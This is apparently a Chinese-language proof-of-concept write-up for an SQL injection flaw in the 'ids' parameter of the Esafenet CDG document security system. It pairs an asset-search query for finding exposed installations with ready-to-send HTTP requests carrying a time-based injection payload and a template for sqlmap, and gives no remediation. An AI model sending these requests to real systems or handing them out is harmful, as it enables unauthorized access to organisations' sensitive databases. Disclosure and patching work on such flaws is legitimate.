# 亿赛通电子文档安全管理系统ids存在SQL注入漏洞

# 一、漏洞简介
 亿赛通电子文档安全管理系统（简称：CDG）是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产，对电子文档进行全生命周期防护，系统具有透明加密、主动加密、智能加密等多种加密方式，用户可根据部门涉密程度的不同（如核心部门和普通部门），部署力度轻重不一的梯度式文档加密防护，实现技术、管理、审计进行有机的结合，在内部构建起立体化的整体信息防泄露体系，使得成本、效率和安全三者达到平衡，实现电子文档的数据安全。亿赛通电子文档安全管理系统ids存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。

# 二、影响版本
+ 亿赛通电子文档安全管理系统

# 三、资产测绘
+ hunter`app.name="ESAFENET 亿赛通文档安全管理系统"`
+ 登录页面

![1693912211487-1ee3eb84-62a3-4c32-806a-6be32537dfb6.png](./img/c0SeDCIhywj7BmwP/1693912211487-1ee3eb84-62a3-4c32-806a-6be32537dfb6-274143.png)

# 四、漏洞复现
```plain
GET /CDGServer3/workflowE/useractivate/update.jsp?flag=1&ids=1,3)WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
Host: {hostname}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Connection: close
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Upgrade-Insecure-Requests: 1
```

![1702456515765-85e20e74-35e6-43c1-9535-88b9bb56f52c.png](./img/c0SeDCIhywj7BmwP/1702456515765-85e20e74-35e6-43c1-9535-88b9bb56f52c-105707.png)

sqlmap

```plain
GET /CDGServer3/workflowE/useractivate/update.jsp?flag=1&ids=1,3)%20 HTTP/1.1
Host: {hostname}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Connection: close
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Upgrade-Insecure-Requests: 1
```

![1702456548688-79eed2f9-fa8a-4c4b-8e7e-61bcda3b85c6.png](./img/c0SeDCIhywj7BmwP/1702456548688-79eed2f9-fa8a-4c4b-8e7e-61bcda3b85c6-737502.png)



> 更新: 2024-04-20 22:01:35  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/tmm1ig5i22zrmpdp>